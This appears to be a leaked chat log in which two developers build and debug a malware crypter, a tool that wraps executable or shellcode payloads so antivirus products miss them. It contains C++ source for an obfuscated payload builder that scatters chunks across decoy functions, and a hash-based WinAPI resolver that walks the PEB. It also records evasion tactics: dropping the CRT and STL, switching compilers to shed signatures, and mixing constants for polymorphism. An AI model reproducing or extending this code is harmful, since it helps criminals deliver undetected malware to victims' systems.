[08.09.21 09:58:38] elroy: You don't need a vector there at all. It's used as an array. Well, use it as an array.
[08.09.21:59:09] basil: I'm afraid there will be an array in the rdata section
[08.09.21 09:59:23] basil: or data
[08.09.21 09:59:31] elroy: I liked your method with function patch to replace entropy.
I.e. we generate functions (a lot, how many - randomly), then in these functions we write chunks of load
[08.09.21 10:00:34] basil: and then we take data via pointer, like on callback functions. Is that what you mean?
[08.09.21 10:02:18] elroy: Yes, but you have to make a header so nothing gets lost.
Add structure with signs that it's loads (random generation 16 bytes per 1 build) and data size, then data goes.
[08.09.21 10:04:41] basil: One more thing. There is a suggestion to add another key to the crypto. So the SolutionBuilder key won't obfuscate the code. Otherwise it's very hard to debug it afterwards. I'm constantly getting tangled in this wilderness
[08.09.21 10:05:00] basil: tell me where you can do that in SolutionBuilder
[08.09.21 10:05:12] elroy: Specify what
[08.09.21 10:05:22] elroy: What kind of key is it?
[08.09.21 10:06:07] basil: --debugversion -dv
[08.09.21 10:06:11] basil: Like this
[08.09.21 10:06:35] basil: ``
   --payload -p <file_path> - path of input .exe, .dll or .bin (shellcode) payload file to crypt it\n"
     --shellcode -sc <32|64> - shellcode arch, if payload is a shellcode
     --shellstring -ss <shellcode> - shellcode payload represented as a string
```
[08.09.21 10:07:01] basil: or arguments for SolutionBuilder
[08.09.21 10:07:09] elroy: You could, but I don't understand why. Make a separate stub, the fourth (there are 3 already there), by analogy with existing ones.
[08.09.21 10:07:43] basil: And remove these ntub
[08.09.21 10:07:45] basil: tags
[08.09.21 10:07:49] basil: Yes. Agreed.
[08.09.21 10:08:07] elroy: ``
const _Stub Standard_Stub =
{
	"standard_old_vs2019",
	"Crypter.sln",
	STUB_STANDARD "Crypter.vcxproj",
	{ "Crypter",
	"\"CrypterReleaseNoLogs|x86\",
	"\"CrypterReleaseNoLogs|x64\",
	"\"CrypterDllReleaseNoLogs|x86\"
	"\"CrypterDllReleaseNoLogs|x64\"
	"C:\\\\"Program Files (x86)\Microsoft Visual Studio\\\2019\\\Enterprise\\Common7\\IDE\devenv.exe\",
	STUB_STANDARD "lib.def",
	"\Bin\\\Crypter\\CrypterReleaseNoLogs\\Win32\Crypter.exe",
	"\Bin\\Crypter\\CrypterReleaseNoLogs\x64\Crypter.exe",
	"\Bin\Crypter\\CrypterDllReleaseNoLogs\Win32\Crypter.dll",
	"\Bin\\\Crypter\\CrypterDllReleaseNoLogs\x64\\Crypter.dll",
	Standard_StubDataFiles,
	sizeof(Standard_StubFilesToObfuscate) / sizeof(_StubFilesToObfuscate),
	Standard_StubFilesToObfuscate
};
```
[08.09.21 10:08:20] elroy: includes -> config.h
[08.09.21 10:09:08] elroy: You can add another stub there (another directory, other files) and "\"CrypterReleaseNoLogs|x86\" - build profile, if you need debug
[08.09.21 10:10:17] basil: Okay. That's what I'll do.
[08.09.21 14:23:45] basil: on site?
[08.09.21 14:25:08] basil: Let me know when you can talk
[08.09.21 14:25:17] elroy: In place
[08.09.21 14:25:19] elroy: Write
[08.09.21 14:26:57] basil: there is a piece of code. It takes data from vector to char* array. The code looks elementary to me. it's like this.
```
		std::vector<char> tmp = ((BufFunc)funcPtr)(&size);
		char* tempChar = tmp.data();
		for (size_t i = 0; i < tmp.size();) {
		resBuf[idx] = tempChar[i];
		idx++;
		i++;
	}
```
[08.09.21 14:28:41] basil: I suspect that some extra data may be put into resBuf array somehow. At the very end of a separate block.  Do you see any error here? Right away. You don't have to delve too deeply into it. In case you didn't notice it right away.
[08.09.21 14:29:30] elroy: ((BufFunc)funcPtr)(&size)
[08.09.21 14:29:34] elroy: What is that?
[08.09.21 14:30:51] elroy: idx is initialized somewhere?
[08.09.21 14:30:52] basil: the whole looks like this:
```
char* buildPayLoad()
{
	// <codeobfuscator:begin_function>
	typedef std::vector<char>(WINAPI* BufFunc)(size_t*);
	void* funcArray;
	ULONG_PTR funcPtr;
	size_t size;
	size_t idx = 0;
	char* resBuf= (char*)f_alloc(ENCRYPT_PAYLOAD_SIZE);

	// <codeobfuscator:begin_block>
	funcArray = f_alloc(sizeof(BufFunc) * FUNC_COUNT + 320 * 240);
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 0) = ((ULONG_PTR)&getBuff0) - 120;
	*((ULONG_PTR*)funcArray + 1) = ((ULONG_PTR)&getBuff1) - 130;
	// <codeobfuscator:end_block
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 2) = ((ULONG_PTR)&getBuff2) - 140;
	*((ULONG_PTR*)funcArray + 3) = ((ULONG_PTR)&getBuff3) - 150;
	// <codeobfuscator:end_block
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 4) = ((ULONG_PTR)&getBuff4) - 160;
	*((ULONG_PTR*)funcArray + 5) = ((ULONG_PTR)&getBuff5) - 170;
	// <codeobfuscator:end_block
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 6) = ((ULONG_PTR)&getBuff6) - 180;
	*((ULONG_PTR*)funcArray + 7) = ((ULONG_PTR)&getBuff7) - 190;
	// <codeobfuscator:end_block
	// <codeobfuscator:begin_block>
	// fakes
	*((ULONG_PTR*)funcArray + 8) = (ULONG_PTR)&getBuff1 - 200;
	*((ULONG_PTR*)funcArray + 9) = (ULONG_PTR)&getBuff2 - 210;
	*((ULONG_PTR*)funcArray + 10) = (ULONG_PTR)&getBuff3 - 220;
	*((ULONG_PTR*)funcArray + 11) = (ULONG_PTR)&getBuff4 - 240;
	*((ULONG_PTR*)funcArray + 12) = (ULONG_PTR)&getBuff5 - 250;
	// <codeobfuscator:end_block>

	for (int i = 0; i < FUNC_COUNT; i++)
	{
		char datebuf[64] = { 0 };
		// <codeobfuscator:begin_block>
		pGetDateFormatA(LOCALE_USER_DEFAULT, 0, NULL, _STR("yyyy"), datebuf, sizeof(datebuf))
		datebuf[0] -= 0x30; datebuf[0] *= 10;
		// <codeobfuscator:end_block>

		// <codeobfuscator:begin_block>
		funcPtr = *((ULONG_PTR*)funcArray + i);
		funcPtr += (100 + datebuf[0] + i * 10);
		// <codeobfuscator:end_block>

		// <codeobfuscator:begin_block>
		std::vector<char> tmp = ((BufFunc)funcPtr)(&size);
		char* tempChar = tmp.data();
		for (size_t i = 0; i < tmp.size();) {
		resBuf[idx] = tempChar[i];
		idx++;
		i++;
	}
		// <codeobfuscator:end_block
	}

	// <codeobfuscator:begin_block>
	globBufStruct BuffersData[] = GLOB_DATA_PAYLOAD_BUFS;
	for (globBufStruct data : BuffersData) {

		for (size_t i = 0; i < data.size; i++) {
			resBuf[idx] = data.data[i];
			idx++;
		}

	}
	// <codeobfuscator:end_block>

	// <codeobfuscator:end_function>
	writeFile((char*) "cryptorPayload", resBuf, ENCRYPT_PAYLOAD_SIZE);
	return resBuf;
}
```
[08.09.21 14:31:04] elroy: is idx initialized somewhere?
[08.09.21 14:31:15] basil: YES
[08.09.21 14:31:36] basil: at the top
[08.09.21 14:31:38] elroy: ok, looking at the code
[08.09.21 14:33:05] basil: can't find it. And the error as I understood from comparing the assembled blocks in cryptter and SolutionBuilder is exactly in ``:
```
		std::vector<char> tmp = ((BufFunc)funcPtr)(&size);
		char* tempChar = tmp.data();
		for (size_t i = 0; i < tmp.size();) {
		resBuf[idx] = tempChar[i];
		idx++;
		i++;
```
[08.09.21 14:34:09] basil: maybe in a loop for (int i = 0; i < FUNC_COUNT; i++)
[08.09.21 14:34:22] basil: the variable names match
[08.09.21 14:35:46] elroy: I'm afraid to ask "why is it written that way?"
```
for (size_t i = 0; i < tmp.size();) {
...
i++;
```
[08.09.21 14:36:12] basil: I did for (size_t i = 0; i < tmp.size();i++)
[08.09.21 14:36:20] basil: but the result is the same
[08.09.21 14:37:11] basil: For now it looks like this. But originally it was of course
for (size_t i = 0; i < tmp.size();i++)
[08.09.21 14:38:14] basil: That's all right. If it didn't work right away, leave it. I'll try again.
[08.09.21 14:38:47] elroy: This is where you create a vector by copying
[08.09.21 14:38:48] elroy: std::vector<char> tmp = ((BufFunc)funcPtr)(&size)
[08.09.21 14:39:00] elroy: see what comes out of it, what size
[08.09.21 14:39:13] basil: ok.
[08.09.21 14:41:45] basil: there's an error in the variable name. If it's like this:
```
char* buildPayLoad()
{
	// <codeobfuscator:begin_function>
	typedef std::vector<char>(WINAPI* BufFunc)(size_t*);
	void* funcArray;
	ULONG_PTR funcPtr;
	size_t size;
	size_t idx = 0;
	char* resBuf= (char*)f_alloc(ENCRYPT_PAYLOAD_SIZE);

	// <codeobfuscator:begin_block>
	funcArray = f_alloc(sizeof(BufFunc) * FUNC_COUNT + 320 * 240);
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 0) = ((ULONG_PTR)&getBuff0) - 120;
	*((ULONG_PTR*)funcArray + 1) = ((ULONG_PTR)&getBuff1) - 130;
	// <codeobfuscator:end_block
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 2) = ((ULONG_PTR)&getBuff2) - 140;
	*((ULONG_PTR*)funcArray + 3) = ((ULONG_PTR)&getBuff3) - 150;
	// <codeobfuscator:end_block
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 4) = ((ULONG_PTR)&getBuff4) - 160;
	*((ULONG_PTR*)funcArray + 5) = ((ULONG_PTR)&getBuff5) - 170;
	// <codeobfuscator:end_block
	// <codeobfuscator:begin_block>
	*((ULONG_PTR*)funcArray + 6) = ((ULONG_PTR)&getBuff6) - 180;
	*((ULONG_PTR*)funcArray + 7) = ((ULONG_PTR)&getBuff7) - 190;
	// <codeobfuscator:end_block
	// <codeobfuscator:begin_block>
	// fakes
	*((ULONG_PTR*)funcArray + 8) = (ULONG_PTR)&getBuff1 - 200;
	*((ULONG_PTR*)funcArray + 9) = (ULONG_PTR)&getBuff2 - 210;
	*((ULONG_PTR*)funcArray + 10) = (ULONG_PTR)&getBuff3 - 220;
	*((ULONG_PTR*)funcArray + 11) = (ULONG_PTR)&getBuff4 - 240;
	*((ULONG_PTR*)funcArray + 12) = (ULONG_PTR)&getBuff5 - 250;
	// <codeobfuscator:end_block>

	for (int i = 0; i < FUNC_COUNT; i++)
	{
		char datebuf[64] = { 0 };
		// <codeobfuscator:begin_block>
		pGetDateFormatA(LOCALE_USER_DEFAULT, 0, NULL, _STR("yyyy"), datebuf, sizeof(datebuf))
		datebuf[0] -= 0x30; datebuf[0] *= 10;
		// <codeobfuscator:end_block>

		// <codeobfuscator:begin_block>
		funcPtr = *((ULONG_PTR*)funcArray + i);
		funcPtr += (100 + datebuf[0] + i * 10);
		// <codeobfuscator:end_block>

		// <codeobfuscator:begin_block>
		std::vector<char> tmp = ((BufFunc)funcPtr)(&size);
		char* tempChar = tmp.data();
		for (size_t k = 0; k < tmp.size();) {
		resBuf[idx] = tempChar[k];
		idx++;
		k++;
	}
		// <codeobfuscator:end_block
	}

	// <codeobfuscator:begin_block>
	globBufStruct BuffersData[] = GLOB_DATA_PAYLOAD_BUFS;
	for (globBufStruct data : BuffersData) {

		for (size_t j = 0; j < data.size; j++) {
			resBuf[idx] = data.data[j];
			idx++;
		}

	}
	// <codeobfuscator:end_block>

	// <codeobfuscator:end_function>
	writeFile((char*) "cryptorPayload", resBuf, ENCRYPT_PAYLOAD_SIZE);
	return resBuf;
}
```
[08.09.21 14:42:08] basil: a little bit of your positive karma
[08.09.21 14:42:11] basil: Thanks
[08.09.21 14:42:17] elroy: ))
[08.09.21 14:42:52] elroy: I could use it too.
[08.09.21 14:43:10] basil: come on. Let's try to exchange
[08.09.21 14:43:15] basil: What's not working?
[08.09.21 14:43:17] basil: ?
[08.09.21 14:43:18] elroy: Rewrote InitializeWinApi code, everything fell apart. Can't reassemble.
[08.09.21 14:43:29] basil: which branch?
[08.09.21 14:43:40] elroy: Or rather, I can build it, it doesn't work now.
[08.09.21 14:43:45] elroy: Locally
[08.09.21 14:44:48] basil: well, I don't know. Maybe send some part of the code? But unequivocally positive astral charge I already sent you
[08.09.21 14:47:57] elroy: Well, look at the original function code
[08.09.21 14:48:14] elroy:
[08.09.21 14:48:53] basil: is it png?
[08.09.21 14:49:32] elroy: no, it's garbage
[08.09.21 14:49:33] elroy: a moment)
[08.09.21 14:49:39] elroy: ``
init_mem_complete:
	// <codeobfuscator:begin_block>
	Mask = 0;
	Ldr = CONTAINING_RECORD(Peb->Ldr->ModuleListMemoryOrder.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList.Flink); // Get the first entry (process executable)
	Ldr = CONTAINING_RECORD(Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList.Flink); // Get the ntdll
	Ldr = CONTAINING_RECORD(Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList.Flink); // Get the kernel32
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
#define pINH ((PIMAGE_NT_HEADERS)RVATOVA(Ldr->DllBase, ((PIMAGE_DOS_HEADER)Ldr->DllBase)->e_lfanew))
#define pIOH ((PIMAGE_OPTIONAL_HEADER)((BYTE*)pINH + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))
#define pIED ((IMAGE_EXPORT_DIRECTORY*)RVATOVA(Ldr->DllBase, pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress))
#define WA_Function ((PDWORD)RVATOVA(Ldr->DllBase, pIED->AddressOfFunctions))
#define WA_Name ((DWORD*)RVATOVA(Ldr->DllBase, pIED->AddressOfNames))
	Ordinal = (WORD*)RVATOVA(Ldr->DllBase, pIED->AddressOfNameOrdinals);
	// <codeobfuscator:end_block

custom_cycle_continue:
	i++;
	if (i < pIED->NumberOfNames)
	{
		// <codeobfuscator:begin_block>
		ptr = (PUCHAR)Ldr->DllBase + WA_Name[i];
		// <codeobfuscator:end_block>
		
		// <codeobfuscator:begin_block>
		Hash = 0;
		while (*ptr) // Compute the hash
		{
			Hash = ((Hash << 8) + Hash + *ptr) ^ (*ptr << 16);
			ptr++;
		}
		// <codeobfuscator:end_block

		if (Mask == M_INIT_ALL)
		{
			//if (Hash == hash_ExitProcess)
			//{
			// // <codeobfuscator:begin_block
			// memset((BYTE*)Ldr->DllBase + WA_Function[Ordinal[i]], 0, sizeof(ULONG_PTR))
			// ExitProcess(0);
			// // <codeobfuscator:end_block
			// goto custom_cycle_continue;
			//}
			//goto custom_cycle_continue;

			if (Hash == hash_Sleep)
			{
				// <codeobfuscator:begin_block>
				WA->dSleep = (tSleep)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_HeapFree)
			{
				// <codeobfuscator:begin_block>
				WA->dHeapFree = (tHeapFree)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_GetModuleHandleW)
			{
				// <codeobfuscator:begin_block>
				WA->dGetModuleHandleW = (tGetModuleHandleW)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_VirtualAlloc)
			{
				// <codeobfuscator:begin_block>
				WA->dVirtualAlloc = (tVirtualAlloc)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_VirtualProtect)
			{
				// <codeobfuscator:begin_block>
				WA->dVirtualProtect = (tVirtualProtect)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
			
			if (Hash == hash_VirtualQuery)
			{
				// <codeobfuscator:begin_block>
				WA->dVirtualQuery = (tVirtualQuery)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
			
			if (Hash == hash_ExitProcess)
			{
				// <codeobfuscator:begin_block>
				WA->dExitProcess = (tExitProcess)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
```
[08.09.21 14:49:50] elroy: ```
			if (Hash == hash_GetCurrentProcess)
			{
				// <codeobfuscator:begin_block
				WA->dGetCurrentProcess = (tGetCurrentProcess)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
			
			if (Hash == hash_ExitThread)
			{
				// <codeobfuscator:begin_block>
				WA->dExitThread = (tExitThread)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
			
			if (Hash == hash_QueryPerformanceFrequency)
			{
				// <codeobfuscator:begin_block>
				WA->dQueryPerformanceFrequency = (tQueryPerformance)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
			
			if (Hash == hash_QueryPerformanceCounter)
			{
				// <codeobfuscator:begin_block>
				WA->dQueryPerformanceCounter = (tQueryPerformance)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_LoadLibraryA)
			{
				// <codeobfuscator:begin_block>
				WA->dLoadLibraryA = (tLoadLibraryA)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_GetProcAddress)
			{
				// <codeobfuscator:begin_block>
				WA->dGetProcAddress = (tGetProcAddress)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

		}
		else
		{
			if (Hash == hash_HeapAlloc)
			{
				// <codeobfuscator:begin_block>
				dHeapAlloc = (tHeapAlloc)CURR_FUNC;
				Mask |= M_LoadLibraryA;
				// <codeobfuscator:end_block>
			}
			
			if (Hash == hash_GetProcessHeap)
			{
				// <codeobfuscator:begin_block>
				dGetProcessHeap = (tGetProcessHeap)CURR_FUNC;
				Mask |= M_GetProcAddress;
				// <codeobfuscator:end_block>
			}

			if (Mask == M_INIT_ALL)
			{
				HANDLE H = dGetProcessHeap();
				pWA = (WinApi*)dHeapAlloc(H, 0, sizeof(WinApi) + GETAPI_KEY % 4096);
				
				// <codeobfuscator:begin_block>
				WA = pWA;
				WA->dHeapAlloc = dHeapAlloc;
				WA->dGetProcessHeap = dGetProcessHeap;
				// <codeobfuscator:end_block>

				i = -1;
			}
		}
		goto custom_cycle_continue;
	}
```
[08.09.21 14:50:18] elroy: I rewrote the loop
[08.09.21 14:50:53] elroy: And replaced those variables with define
[08.09.21 14:51:00] elroy: kicked them out of the stack
[08.09.21 14:52:05] elroy: ``
pWA = (WinApi*)dHeapAlloc(H, 0, sizeof(WinApi) + GETAPI_KEY % 4096);
```
This is where the exception is caught
[08.09.21 14:52:25] basil: looking
[08.09.21 14:52:26] elroy: I can't understand why, looks like wrong address is fetched
[08.09.21 14:56:06] basil: i is initialized?
[08.09.21 14:57:51] elroy: Yes, here in the cycle the names and hashes work correctly
```
// <codeobfuscator:begin_block>
		ptr = (PUCHAR)Ldr->DllBase + WA_Name[i];
		// <codeobfuscator:end_block>
		
		// <codeobfuscator:begin_block>
		Hash = 0;
		while (*ptr) // Compute the hash
		{
			Hash = ((Hash << 8) + Hash + *ptr) ^ (*ptr << 16);
			ptr++;
		}
		// <codeobfuscator:end_block
```
[08.09.21 14:57:59] elroy: That is correct
[08.09.21 14:58:26] elroy: * i is correct
[08.09.21 15:01:06] basil: no. I can't see.
[08.09.21 15:01:54] elroy: Here's the code that should work, but doesn't. How can you make code that shouldn't work?)
[08.09.21 15:02:53] basil: it'll work now, you'll see)))
[08.09.21 15:04:00] basil: what about what doesn't work for me... I don't even know what to answer, except "Fools are lucky".
[08.09.21 15:04:04] basil: I guess so.
[08.09.21 15:06:23] elroy: No, not fools.
[08.09.21 15:06:52] basil: OOOOOOOOOOOOOOOOOOOOOOOOOOOO. Balm for my wounded soul.
[08.09.21 15:07:23] basil: Listen. Make an entrance, have a cup of coffee.
[08.09.21 15:07:40] basil: Well, it looks like you're already under hypnosis.
[08.09.21 15:07:50] elroy: It's not there.)
[08.09.21 15:08:03] elroy: Just ran it now, ran the debugger
[08.09.21 15:08:11] basil: It doesn't matter if she is there or not
[08.09.21 15:08:26] elroy: GetProcessHeap() returned, but HeapAlloc - access denied
[08.09.21 15:08:32] basil: it's important how you perceive it!
[08.09.21 15:08:46] basil: I'm telling you absolutely seriously
[08.09.21 15:09:00] elroy: "Do you see a mistake? - No. It's there."
[08.09.21 15:09:08] elroy: ))
[08.09.21 15:09:36] basil: [loud hysterical laughter]
[08.09.21 15:10:10] basil: You just said cooler things than "the crypter brushes itself. Alive!"
[08.09.21 15:52:28] elroy:
[08.09.21 15:52:46] elroy: It did call HeapAlloc and dropped
[08.09.21 15:52:49] elroy: cool!!!
[08.09.21 15:53:37] basil: it happens....
[08.09.21 15:54:00] basil: what to do
[08.09.21 15:54:10] elroy: I thought the address didn't work there. No, the address works.
[08.09.21 15:54:27] basil: I had it fail too... Once again...
[08.09.21 15:54:38] elroy: I don't know. It's a mystery...
[08.09.21 15:54:39] basil: So I guess it's not about karma.
[08.09.21 15:56:04] basil: You know, it always seems to me that when you write "riddle" you raise your eyes to the sky dreamily
[08.09.21 15:56:27] basil: i have that feeling
[08.09.21 15:57:31] basil: Oh, come on .... I guess it's not a fishy day
[08.09.21 15:58:26] basil: I'm falling apart today too
[08.09.21 15:59:01] elroy: Yeah, looked at the sky, but there's no answer
[08.09.21 15:59:26] elroy: can't call HeapAlloc
[08.09.21 15:59:31] elroy: Not allowed
[08.09.21 16:00:16] basil: )))
[08.09.21 16:00:54] basil: I'm gonna step away now. I'll be closer to 21:00 Moscow time.
[09.09.21 12:51:45] basil: Greetings.
[09.09.21 12:51:57] elroy: Hello.
[09.09.21 12:53:22] basil: I got rid of stl in buildPayload. The error was in:
```
		std::vector<char> tmp = ((BufFunc)funcPtr)(&size);
		char* tempChar = tmp.data();
		for (size_t k = 0; k < size; k++)
			resBuf[idx++] = tempChar[k];
```
[09.09.21 12:53:47] basil: for some reason the data size in the vector was incorrect
[09.09.21 12:53:59] basil: if you use for (size_t k = 0; k < size; k++)
[09.09.21 12:54:03] basil: instead of
[09.09.21 12:54:20] basil: for (size_t k = 0; k < tmp.size(); k++)
[09.09.21 12:54:28] basil: That works
[09.09.21 12:55:19] basil: made 8 builds worked correctly. Now deleting vector as data storing object in code section
[09.09.21 12:55:32] basil: load data
[09.09.21 12:55:40] elroy: ``
std::vector<char> tmp
```
Isn't that stl? Is this going to stay? I don't understand anything)
[09.09.21 12:56:21] basil: It is now. But I'm redesigning SolutionBuilder now according to the scheme you suggested yesterday.
[09.09.21 12:56:59] basil: std::vector<char> tmp will go
[09.09.21 12:57:14] elroy: Yeah, that's good
[09.09.21 12:57:37] elroy: There's a Represent class, are you redoing it?
[09.09.21 12:57:47] basil: That's right.
[09.09.21 12:58:02] elroy: You don't need to redo it, just extend it
[09.09.21 12:58:40] elroy: class ReprFunc_VectorChar : public Represent
Similarly, make a new heir
[09.09.21 12:59:12] basil: and override methods?
[09.09.21 12:59:20] elroy: Yes
[09.09.21 12:59:26] elroy: Then call it
[09.09.21 12:59:44] elroy: That way you can mix different presentation methods
[09.09.21 13:00:31] basil: I agree. Yes, you can. The only one is a little rationalization suggestion
[09.09.21 13:04:11] basil: I think it's not very correct to patch cryptor in code section to store load there. I think it's better like this:
```
char* getPayloadBlockFromTextSect(){
char* blockData=malloc(BLOCK_SIZE);
blockData[0]=1;
blockData[1]=3;
.....
blockData[BLOCK_SIZE-1]=10;
return blockData;
}
```
[09.09.21 13:04:23] basil: Do you mind?
[09.09.21 13:05:22] elroy: If it's in the code section: =1, then fine, but if it flies into the constants section, then fine
[09.09.21 13:05:39] basil: It will be in the code section
[09.09.21 13:05:50] basil: That's exactly what's happened so far. Tried
[09.09.21 13:06:03] elroy: Do it, let's see what happens
[09.09.21 13:06:07] basil: Okay.
[09.09.21 13:06:35] elroy: blockData[i++]
[09.09.21 13:06:39] elroy: Do this
[09.09.21 13:06:50] elroy: Or alternatively do both
[09.09.21 13:07:07] elroy: I just don't like constants there
[09.09.21 13:07:24] basil: yes. The polymorphism would be higher
[09.09.21 13:07:51] elroy: If with constants, then not in a row, but mixed
[09.09.21 13:08:16] elroy: blockData[18]=3
blockData[153]=8
...
[09.09.21 13:08:45] basil: yes. by the way. that's what I didn't think. Okay. Good suggestion.
[09.09.21 13:09:20] elroy: Another positive feedback on crypto
[09.09.21 13:09:46] elroy: manuel wrote today:
```
Will it get cleaned up? There are men out there only your stack can take some of the nets
They don't use any other stacks
```
[09.09.21 13:10:32] basil: Balsams! Balsam.....
[09.09.21 13:10:39] basil: For my wounded soul
[09.09.21 13:11:02] basil: I can imagine what will happen when we go to obfuscation in early time
[09.09.21 13:11:11] basil: Balm!
[09.09.21 13:11:20] elroy: By the way, yes
[09.09.21 13:11:41] elroy: not much news now, detects are all hanging on crt, on vectors function
[09.09.21 13:12:06] elroy: I cleaned the dll by accident today, gave it to him. He says he's happy there))
[09.09.21 13:12:47] basil: Well it should work . Should crt go away.
[09.09.21 13:13:01] basil: There seems to be not much left
[09.09.21 13:13:04] elroy: And cleaned by accident, changed percentage of crt/arithm. and step of garbage code in reprezent
[09.09.21 13:14:30] elroy: Yesterday I defeated that HeapAlloc, replaced it with VirtualAlloc, allocated memory, everything worked. And HeapAlloc stopped working for redesigned WinApi.
But when it worked, the detection came back))
[09.09.21 13:14:37] elroy: Damn emulator...
[09.09.21 13:16:13] basil: We'll win anyway! Here's to the success of our GREAT cause! I already sent you my astral charge))))
[09.09.21 13:16:26] basil: And in general, make an "entrance"
[09.09.21 13:17:03] elroy: Soon there will be a sieve, a lot of inputs already, but no exit...
[09.09.21 13:17:43] basil: I meant well... Thought I'd brighten your mood. Only in good faith.
[09.09.21 13:18:14] elroy: I know.)
[09.09.21 13:18:26] elroy: I'll try 2021 studio.
[09.09.21 13:18:32] elroy: Maybe the detection will go away
[09.09.21 13:19:41] basil: Is there one? I did not know
[09.09.21 13:19:56] basil: Can you send me the link? I'll put it for me too.
[09.09.21 13:20:00] elroy: 21 years are coming to an end...
[09.09.21 13:20:49] elroy: https://visualstudio.microsoft.com/vs/preview/
[09.09.21 13:21:05] elroy: It's 2022, in preview yet
[09.09.21 13:21:25] elroy: The instructions for downloading the offline version of the full version are the same
[09.09.21 13:21:40] basil: Thank you))
[09.09.21 13:21:53] elroy: vs_enterprise.exe --layout G:\VSLayout --all --lang en-US
[09.09.21 13:22:34] basil: ok
[09.09.21 14:13:04] elroy: On 2022 studio it's clean. Detects on crt for sure)
[09.09.21 14:13:33] basil: Wait. I don't get it.
[09.09.21 14:13:45] basil: went to 2022 clean
[09.09.21 14:14:15] basil: but if you build on 2019 there are detects on crt. Did I get that right?
[09.09.21 14:14:23] elroy: Yes
[09.09.21 14:14:53] basil: then he compiles seh somehow differently
[09.09.21 14:15:13] elroy: We build the same code with different crt, one case has detects, the other does not. Question, on code detects or on crt ?)
[09.09.21 14:15:36] elroy: It's not just seh
[09.09.21 14:16:19] basil: it must be somehow related. From the form of the code comes the crt. Or is it not?
[09.09.21 14:16:35] basil: apparently crt is different now
[09.09.21 14:16:42] basil: The signature has changed
[09.09.21 14:16:51] basil: although all the same
[09.09.21 14:18:02] elroy: According to my observations, the compiler shoves functions that implement vector functionality. Allocators, etc. Depending on how vectors and operations on them are used in the code, the list of functions that the compiler shoves in is formed. And probably their order.
[09.09.21 14:19:08] basil: Well, congratulations anyway
[09.09.21 14:19:33] elroy: It works manually... There's a bug in the script compilation.
[09.09.21 14:20:12] elroy: SolutionBuilder calls studio to compile project, and message "path not found". I don't know what it is.
[09.09.21 14:20:18] elroy: I've fixed the paths.
[09.09.21 14:21:30] basil: Well, I guess it's not critical. Compared to the detects. So to speak, a matter of technique.
[09.09.21 14:22:01] elroy: If it doesn't work, it's critical
[09.09.21 14:23:03] basil: It will work.
[09.09.21 14:23:08] basil: It won't go anywhere
[09.09.21 14:24:37] elroy: Yeah, you're right.
[09.09.21 14:25:04] elroy: You got the tracks wrong. There are two slashes everywhere, and one in one place - one, the wrong symbol)
[09.09.21 14:25:17] elroy: I'll get another profile.
[09.09.21 14:25:46] elroy: Did you create profile for version without crt in config.h ?
[09.09.21 14:26:30] basil: At the moment. I would like to debug the code and kill the crt first
[09.09.21 14:26:44] basil: not at the moment
[09.09.21 14:26:57] elroy: ok
[10.09.21 11:09:05] basil: hello
[10.09.21 11:23:16] basil: Well, I managed to remove vector from cryptra. Tested it works. Now in the process of configuring the project. And switching it completely to "mode" without crt
[10.09.21 11:30:58] elroy: Greetings
[10.09.21 11:31:06] elroy: That's good
[10.09.21 11:31:15] elroy: intermediate version?
[10.09.21 11:31:52] basil: what is meant by "intermediate variant"?
[10.09.21 11:31:59] basil: I just don't understand
[10.09.21 11:32:09] elroy: without vector, but still with crt
[10.09.21 11:32:17] basil: well, I certainly can
[10.09.21 11:32:25] basil: branching?
[10.09.21 11:32:26] elroy: Do it, I need it.
[10.09.21 11:33:20] elroy: It is desirable. You can prepare your current vector to work without vector, then tell me the commit and keep on working. I'll take it in
[10.09.21 11:33:42] basil: ok.
[10.09.21 11:34:56] elroy: > should i spill it?
no need to spill)
[10.09.21 11:35:07] elroy: I read "implement"
[10.09.21 11:35:16] basil: okay.
[10.09.21 11:39:32] basil: listen, well, here I kind of managed to pour develop into develop_not_crt_crypter without conflicts. May I merge this branch into develop and upload it all to the server?
[10.09.21 12:04:07] elroy: I will do it myself.
[10.09.21 12:04:15] elroy: I'll double-check it.)
[10.09.21 12:04:23] elroy: What commit?
[10.09.21 12:05:33] basil: full_deleted_vector_from_UniCrypterProj branch develop_not_crt_crypter
[10.09.21 12:05:47] elroy: thank you
[10.09.21 12:49:00] elroy: Looked at the code, I will take it to develop. But you should update your develop, I did not see in a new branch some of improvements, apparently your version of develop is not so fresh
[10.09.21 12:49:36] basil: ok
[10.09.21 12:57:37] elroy: I have a 8 megabyte file now instead of 1.3
